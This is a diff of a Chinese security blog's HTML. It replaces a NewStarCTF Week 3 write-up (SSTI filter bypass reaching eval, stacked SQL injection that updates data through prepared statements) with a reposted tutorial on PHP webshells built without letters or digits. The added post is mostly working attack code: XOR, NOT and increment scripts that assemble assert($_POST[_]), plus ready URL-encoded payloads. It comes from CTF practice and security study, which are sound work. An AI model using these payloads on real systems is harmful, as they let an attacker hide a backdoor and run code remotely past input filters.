@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/14/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/10/14/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/" class="post-title-link" itemprop="url">NewStarCTF 公开赛赛道 WEEK3 WP</a>
+          <a href="/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/" class="post-title-link" itemprop="url">不包含字母和数字的webshell</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-10-14 22:14:45" itemprop="dateCreated datePublished" datetime="2022-10-14T22:14:45+08:00">2022-10-14</time>
+      <time title="创建时间：2022-10-18 11:11:21" itemprop="dateCreated datePublished" datetime="2022-10-18T11:11:21+08:00">2022-10-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2022/10/14/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/" class="post-meta-item leancloud_visitors" data-flag-title="NewStarCTF 公开赛赛道 WEEK3 WP" title="阅读次数">
+    <span id="/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/" class="post-meta-item leancloud_visitors" data-flag-title="不包含字母和数字的webshell" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>3k</span>
+      <span>9.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
@@ -283,107 +283,235 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a><strong>BabySSTI_One</strong></h4><p>根据题目提示应该是SSTI模板注入，所以我们进行验证一下</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-91.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用?name=&#123;&#123;&#x27;&#x27;.class&#125;&#125;发现class被过滤了</span><br></pre></td></tr></table></figure>
+          <p>转载自：</p>
+<p>[一些不包含数字和字母的webshell](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum.html)</p>
+<p>[无字母数字webshell之提](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-">https://www.leavesongs.com/PENETRATION/webshell-without-</a><br>alphanum-advanced.html)[高篇](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum-advanced.html)</p>
+<p>首先感谢离别歌师傅的文章，有兴趣的小伙伴可以关注一下离别歌师傅的个人博客：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/">离别歌</a></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li>基础篇<ul>
+<li>一、提出问题</li>
+<li>二、思路</li>
+<li>三、方法一</li>
+<li>四、方法二</li>
+<li>五、方法三</li>
+</ul>
+</li>
+<li>提高篇<ul>
+<li>PHP7下绕过</li>
+</ul>
+</li>
+</ul>
+<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h3 id="一、提出问题"><a href="#一、提出问题" class="headerlink" title="一、提出问题"></a>一、提出问题</h3><p>如何编写一个不使用字母和数字的webshell？</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+if (!preg_match(&#39;/[a-z0-9]/is&#39;, $_GET[&#39;shell&#39;])) &#123;
+    eval($_GET[&#39;shell&#39;]);
+&#125; else &#123;
+    echo &quot;hacker&quot;;
+&#125;
+</code></pre>
+<h3 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h3><p>使用非数字、字母的字符进行变换来得到字母和数字。</p>
+<h3 id="三、方法一"><a href="#三、方法一" class="headerlink" title="三、方法一"></a>三、方法一</h3><p>使用异或运算，两个字符串异或操作之后，得到的还是一个字符串，所以我们可以通过两个字符异或运算来得到另外一个字符。</p>
+<blockquote>
+<p>写的PHP代码来得到我们想要的字符串：</p>
+</blockquote>
+<pre><code>&lt;?php
+/**
+ * 1、我需要做什么？
+ * 我需要的是将两个非字母数字的字符异或之后得到某个字母
+ * 2、我该怎么做？
+ *      使用一个循环来跟指定的字符进行异或，再判断是否是我们想要的内容
+ */
+$a = &quot;]&quot;;
+// 这个值必须是没有被过滤的值
+$argv = str_split(&quot;POST&quot;);
+// 这里是你要异或得到的值
+for ($i = 0; $i &lt; count($argv); $i++) &#123;
+    for ($j = 0; $j &lt; 255; $j++) &#123;
+        $k = chr($j) ^ $a;
+        if ($k == $argv[$i]) &#123;
+            $flag = dechex($j);
+            if (strlen($flag) &lt; 2) &#123;
+                $flag = &quot;%0&quot; . $flag;
+                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;
+            &#125; else &#123;
+                $flag = &quot;%&quot; . $flag;
+                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>写的勉勉强强，大佬别骂……</p>
+<p>然后我们可以构造这样的内容</p>
+<pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=assert$__=&#39;_&#39;.(&#39;%0d&#39;^&#39;]&#39;).(&#39;%12&#39;^&#39;]&#39;).(&#39;%0e&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=_POST$___=$$__;$_($___[_]); // assert($_POST[_]);
+</code></pre>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-150-1024x539.png"></p>
+<blockquote>
+<p>这里有一个疑问，为什么前面的assert跟<code>]</code>搭配就没作用了，后面的POST跟&#96;&#96;&#96;搭配也没有作用</p>
+</blockquote>
+<p>这里还有一个别人的脚本</p>
+<pre><code>&lt;?php
+$l = &quot;&quot;;
+$r = &quot;&quot;;
+$argv = str_split(&quot;POST&quot;);
+for ($i = 0; $i &lt; count($argv); $i++) &#123;
+    for ($j = 0; $j &lt; 255; $j++) &#123;
+        $k = chr($j) ^ chr(255);
+        // dechex(255) = ff
+        if ($k == $argv[$i]) &#123;
+            if ($j &lt; 16) &#123;
+                $l .= &quot;%ff&quot;;
+                $r .= &quot;%0&quot; . dechex($j);
+                continue;
+            &#125;
+            $l .= &quot;%ff&quot;;
+            $r .= &quot;%&quot; . dechex($j);
+            continue;
+        &#125;
+    &#125;
+&#125;
+echo &quot;(&#39;$l&#39;^&#39;$r&#39;)&quot;;
+?&gt;
 
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-92.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所以我们使用?name=&#123;&#123;&#x27;&#x27;[&#x27;cla&#x27;+&#x27;ss&#x27;]&#125;&#125;进行绕过，然后使用</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#125;&#125;可以得到object类</span><br></pre></td></tr></table></figure>
+// poc$_=(&#39;%ff%ff%ff%ff%ff%ff&#39;^&#39;%9e%8c%8c%9a%8d%8b&#39;);// assert$__=&#39;_&#39;.(&#39;%ff%ff%ff%ff&#39;^&#39;%af%b0%ac%ab&#39;);// _POST$___=$$__;// $_POST$_($___[_]);// assert($_POST[_])
+</code></pre>
+<p>也是可以使用的</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-152-1024x531.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<h3 id="四、方法二"><a href="#四、方法二" class="headerlink" title="四、方法二"></a>四、方法二</h3><p>这个方法和第一个方法是差不多的，但是编写脚本……算了吧，我还是使用大佬现成的吧。这个方法是利用取反来得到字母，比如<code>&#39;和&#39;&#123;2&#125;</code>得到的结果为<code>\x8c</code>，取反得到的字母为<code>s</code>。这里想不太明白，复现成功，PHP版本会产生一定的影响，先放在这里，找时间来看看</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-92.png"></p>
+<pre><code>&lt;?php
+$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);
+$_ = $__ / $__;
+$____ = &#39;&#39;;
+$___ = &quot;瞰&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$___ = &quot;的&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;半&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;始&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$_____ = &#39;_&#39;;
+$___ = &quot;俯&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+$___ = &quot;瞰&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+$___ = &quot;次&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+$___ = &quot;站&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+$_ = $$_____;
+$____($_[$__]);
+</code></pre>
+<p>这里最好进行一次url编码</p>
+<blockquote>
+<p>poc</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc:%24%20%3D%20(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%2B(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%3B%24_%20%3D%20%24%20%2F%20%24%3B%24_%20%3D%20&#x27;&#x27;%3B%24%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%9A%84%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%8D%8A%22%3B%24%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%A7%8B%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20&#x27;</span><br><span class="line">_&#x27;%3B%24_</span><br><span class="line">%20%3D%20%22%E4%BF%AF%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E6%AC%A1%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%AB%99%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%24%24_%3B%0A%24(%24_%5B%24__%5D)%3B</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-93.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;&#125;&#125;得到所有子</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-153-1024x540.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<p>这里是利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP是弱类型语言，true的值为1，所以<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code></p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-96-1024x162.png"></p>
+<blockquote>
+<p>将上面的代码运行一下（这里还有一些注释，大佬果然不一样啊……）</p>
+</blockquote>
+<pre><code>&lt;?php
+$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);
+// $__ = 2
+$_ = $__ / $__;
+// $_ = 1
+$____ = &#39;&#39;;
+$___ = &quot;瞰&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;瞰&quot;&#123;1&#125;) =&gt; a
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; as
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; ass
+$___ = &quot;的&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;的&quot;&#123;1&#125;) =&gt; asse
+$___ = &quot;半&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;半&quot;&#123;1&#125;) =&gt; asser
+$___ = &quot;始&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;始&quot;&#123;2&#125;) =&gt; assert
+//# 最后:$____ = assert
+$_____ = &#39;_&#39;;
+$_____ = &#39;_&#39;;
+$___ = &quot;俯&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;俯&quot;&#123;2&#125;) =&gt; _P
+$___ = &quot;瞰&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;瞰&quot;&#123;2&#125;) =&gt; _PO
+$___ = &quot;次&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;次&quot;&#123;1&#125;) =&gt; _POS
+$___ = &quot;站&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;站&quot;&#123;1&#125;) =&gt; _POST
+// 最后:$_____ = _POST
+$_ = $$_____;// $_POST
+$____($_[$__]);// assert($_POST[2])
+</code></pre>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-97-1024x543.png"></p>
+<h3 id="五、方法三"><a href="#五、方法三" class="headerlink" title="五、方法三"></a>五、方法三</h3><p>方法二是使用了位运算，方法三是不再使用位运算来搞定这个题目的，完全阐释了这两张图啊，大佬才能想出来的东西，我直接好家伙……</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-98.png"><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-99.png"><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-100-1024x543.png"></p>
+<p>说了这么多，其实就是<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>,<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>，所以我们只要拿到一个变量就可以得到所以的变量了</p>
+<p>这时候大佬又正好了，而我是直接放弃了……数组中可以得到大小写a，就相当于我们拿到了所有的字母</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-101-1024x119.png"></p>
+<p>利用这个技巧，我们就可以编写如下的webshell了</p>
+<pre><code>&lt;?phphighlight_file(__FILE__);$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;// 因为A和S相差18，所以要$__++十八次，下面也是相同的道理$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);
+</code></pre>
+<p>php对大小写不敏感，所以使用<code>ASSERT($_POST[_]);</code>也是可以的，运行结果如下：</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-154-1024x539.png"></p>
+<p>绕过也是成功的：</p>
+<p>老规矩，还是得进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%24%3D%5B%5D%3B%24%3D%40%22%24%22%3B%24%3D%24%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24%3B%24%3D%24_%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24__%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24__%3D&#x27;</span><br><span class="line">_&#x27;%3B%24__</span><br><span class="line">%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24.%3D%24%3B%24%3D%24%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24%2B%2B%3B%24_.%3D%24__%3B%24%3D%24%24%3B%24__(%24%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-94.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后我们获取os._wrap_close类，使用</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;[117]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-95.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-96.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117[&#x27;glob&#x27;+&#x27;als&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-97.png"></p>
-<p>然后找到eval</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用的是?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;[&#x27;eval&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-98.png"></p>
-<p>然后我们使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;&#x27;eval&#x27;&#125;&#125;可以执行命令，在根目录下发现了flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-99.png"></p>
-<p>发现cat和flag都在黑名单中</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-100.png"></p>
-<p>这里使用base编码绕过，因为base也在黑名单中，使用\进行转义</p>
-<p>使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;&#x27;__cla&#x27;+&#x27;ss__&#x27;&#x27;__subcl&#x27;+&#x27;asses__&#x27;117&#x27;__glob&#x27;+&#x27;als__&#x27;&#x27;eval&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-101.png"></p>
-<p>之后看了一下其他师傅的wp，发现自己的思路可能存在一些问题，想的太复杂了……</p>
-<h4 id="multiSQL"><a href="#multiSQL" class="headerlink" title="multiSQL"></a><strong>multiSQL</strong></h4><p>输入火华，发现回显的是他的成绩</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-102.png"></p>
-<p>然后测试发现select、insert、union、update、updatexml都被过滤了，然后我们发现可以进行堆叠注入，所以我们使用%E7%81%AB%E5%8D%8E’;show<br>tables;#得到表名</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-103.png"></p>
-<p>然后使用%E7%81%AB%E5%8D%8E’;show columns from score;#得到字段名</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-104.png"></p>
-<p>因为要帮火华师傅修改成绩啊，所以我们要使用update，但是被过滤了，所以我们这样来修改后台数据，使用-1’;set @sql &#x3D;<br>CONCAT(‘up’,’date score set listen&#x3D;200’);prepare stmt from @sql;EXECUTE<br>stmt;#，最后点击验证成绩得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-105.png"></p>
-<h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><p>题目给出了源码</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-106.png"></p>
